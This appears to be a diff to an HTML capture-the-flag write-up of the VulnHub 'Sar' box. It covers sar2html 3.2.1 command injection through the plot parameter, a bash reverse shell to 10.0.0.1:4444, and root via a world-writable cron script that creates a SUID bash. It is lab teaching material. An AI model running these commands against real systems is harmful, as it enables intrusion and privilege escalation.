@@ -21,7 +21,7 @@ layout: default
         <li><a href="#portscan">Port Scanning</a></li>
         <li><a href="#infogather">Information Gathering</a></li>
         <li><a href="#foothold">Foothold</a></li>
-        <li><a href="#root">Privesc - root</a></li>
+        <li><a href="#root">Shell - root</a></li>
     </ul>
     
     <p>This box is on the easy side.  It starts off with only a web server on port 80.  After web enumeration we find a vulnerable service running.  We exploit it to gain a shell as www-data.  Then we exploit a cron job to gain a root shell.</p>
@@ -46,46 +46,39 @@ layout: default
 
     <li>The web server on port 80 seems to be the only service running.  I start off with some gobuster scans to try to enumerate any hidden directories.  Nothing turns up so I turn my attention to /robots.txt.</li>
 
+    <br>
+    <br>
+
     <img src="../images/sar/robots.png">
 
     <li>The robots.txt file lists "sar2HTML", so I visit that directory, which takes us to a webste hosting sar2html version 3.2.1.  I use searchsploit and look for an exploit for sar2html 3.2.1 and I get results.</li>
 
     <pre>
-┌──(kali㉿kali)-[~/Documents/VulnHub/Sars]
-└─$ searchsploit sar2html
----------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                    |  Path
----------------------------------------------------------------------------------- ---------------------------------
-sar2html 3.2.1 - 'plot' Remote Code Execution                                     | php/webapps/49344.py
-Sar2HTML 3.2.1 - Remote Command Execution                                         | php/webapps/47204.txt
----------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
-                                                                                                                    
-┌──(kali㉿kali)-[~/Documents/VulnHub/Sars]
-└─$ searchsploit -m 49344
-  Exploit: sar2html 3.2.1 - 'plot' Remote Code Execution
-      URL: https://www.exploit-db.com/exploits/49344
-     Path: /usr/share/exploitdb/exploits/php/webapps/49344.py
-File Type: Python script, ASCII text executable
-
-Copied to: /home/kali/Documents/VulnHub/Sars/49344.py
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Sars]&#13;&#10;&boxur;&HorizontalLine;$ searchsploit sar2html&#13;&#10;---------------------------------------------------------------------------------- ---------------------------------&#13;&#10; Exploit Title                                                                    |  Path&#13;&#10;---------------------------------------------------------------------------------- ---------------------------------&#13;&#10;sar2html 3.2.1 - &apos;plot&apos; Remote Code Execution                                     | php/webapps/49344.py&#13;&#10;Sar2HTML 3.2.1 - Remote Command Execution                                         | php/webapps/47204.txt&#13;&#10;---------------------------------------------------------------------------------- ---------------------------------&#13;&#10;Shellcodes: No Results&#13;&#10;                                                                                                                    &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Sars]&#13;&#10;&boxur;&HorizontalLine;$ searchsploit -m 49344&#13;&#10;  Exploit: sar2html 3.2.1 - &apos;plot&apos; Remote Code Execution&#13;&#10;      URL: https://www.exploit-db.com/exploits/49344&#13;&#10;     Path: /usr/share/exploitdb/exploits/php/webapps/49344.py&#13;&#10;File Type: Python script, ASCII text executable&#13;&#10;&#13;&#10;Copied to: /home/kali/Documents/VulnHub/Sars/49344.py
     </pre>
+
+    <h2><a id="www-data">Shell - www-data</a></h2>
 
     <li>I download php/webapps/49344.py to take a look at.</li>
 
     <img src="../images/sar/exploit_script.png">
 
+    <br>
+    <br>
+
     <li>Based on the exploit script above, we can simply execute commands by browsing to the url /sar2HTML/index.php?plot=;&lt;command&gt;</li>
 
     <img src="../images/sar/manual_exploit.png">
+
+    <br>
+    <br>
 
     <li>In the above, we can see how we are manually able to do what the script does, and it works.  We get command execution.  Now we go for a reverse shell.  I will use "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'" for my reverse shell and url encode it.</li>
 
     <img src="../images/sar/rev_shell.png">
 
     <br>
-
-    <h2><a id="foothold">Foothold</a></h2>
+    <br>
 
     <li>One of the first things I always do is check for cronjobs using "cat /etc/cron*"</li>
 
@@ -107,7 +100,9 @@ www-data@sar:/var/www/html$ ls -la write.sh&#13;&#10;-rwxrwxrwx 1 www-data www-d
 
     <li>write.sh simply creates the file /tmp/gateway.  However, we have write access to write.sh, so all we need to do is edit the contents with our own malicious command.  When root runs finally.sh under it's cronjob, it will execute write.sh, which will execute out malicious command.</li>
 
-    <h2><a id="root">Privesc - Root</a></h2>
+    <br>
+    
+    <h2><a id="root">Shell - Root</a></h2>
 
     <pre>
 www-data@sar:/var/www/html$ cat write.sh &#13;&#10;#!/bin/sh&#13;&#10;&#13;&#10;cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
